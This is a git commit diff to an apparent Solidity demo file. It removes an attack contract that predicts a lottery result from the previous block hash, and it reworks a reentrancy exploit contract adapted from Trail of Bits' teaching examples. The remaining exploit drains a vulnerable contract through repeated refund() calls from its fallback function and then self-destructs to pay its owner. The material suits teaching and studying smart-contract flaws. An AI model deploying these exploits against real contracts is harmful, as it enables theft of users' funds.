f9408dabaff19607df8f47abf3210f38f6a5288c
Paul <paul.marty.46@gmail.com>
2018-05-31 21:48:01 +0200

    bug fixes 2

--- demo-contract.sol
+++ demo-contract.sol
@@ -1,35 +1,4 @@
-pragma solidity ^0.4.24;
-
-contract predictBet{
-    address public vulnerable_contract;
-    address public owner;
-    
-    function predictBet() public{
-            owner = msg.sender;
-        }
-    
-   function deposit(address _vulnerable_contract) public payable{
-        vulnerable_contract = _vulnerable_contract ;
-        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
-    }
-    
-    function launch_attack() public{
-        require(vulnerable_contract.call(bytes4(sha3("refund()"))));
-    }  
-   
-   function win() public{
-        byte toGuess = byte(blockhash(block.number-1));
-        GDGLottery instance = GDGLottery(vulnerable_contract);
-        instance.bet(toGuess);
-   }
-   
-   
-   function get_money(){
-        suicide(owner);
-    }
-   
-   
-}
+pragma solidity ^0.4.15;
 
 contract GDGLottery {
 
@@ -87,32 +56,29 @@ contract GDGLottery {
         return _seed % upper;
     }
 }
-pragma solidity ^0.4.19;
 
 
-    // Trailofbits : (Not So) Smart Contracts
+
+    //Inspired by Trailofbits : (Not So) Smart Contracts
     //https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/ReentrancyExploit.sol
-    pragma solidity ^0.4.15;
 
-    contract ReentranceExploit {
+
+    contract ExploitContract {
         bool public attackModeIsOn=false; 
         address public vulnerable_contract;
         address public owner;
 
-        function ReentranceExploit() public{
+        function ExploitContract() public{
             owner = msg.sender;
         }
 
         function deposit(address _vulnerable_contract) public payable{
             vulnerable_contract = _vulnerable_contract ;
-            // call addToBalance with msg.value ethers
             require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
         }
 
         function launch_attack() public{
             attackModeIsOn = true;
-            // call withdrawBalance
-            // withdrawBalance calls the fallback of ReentranceExploit
             require(vulnerable_contract.call(bytes4(sha3("refund()"))));
         }  
 
@@ -123,8 +89,6 @@ pragma solidity ^0.4.19;
         }
 
         function () public payable{
-            // atackModeIsOn is used to execute the attack only once
-            // otherwise there is a loop between withdrawBalance and the fallback function
             if (attackModeIsOn){
                 attackModeIsOn = false;
                     require(vulnerable_contract.call(bytes4(sha3("refund()"))));
@@ -132,7 +96,7 @@ pragma solidity ^0.4.19;
         }
     
         function get_money(){
-            suicide(owner);
+            suicide(owner);  
         }
 
     }
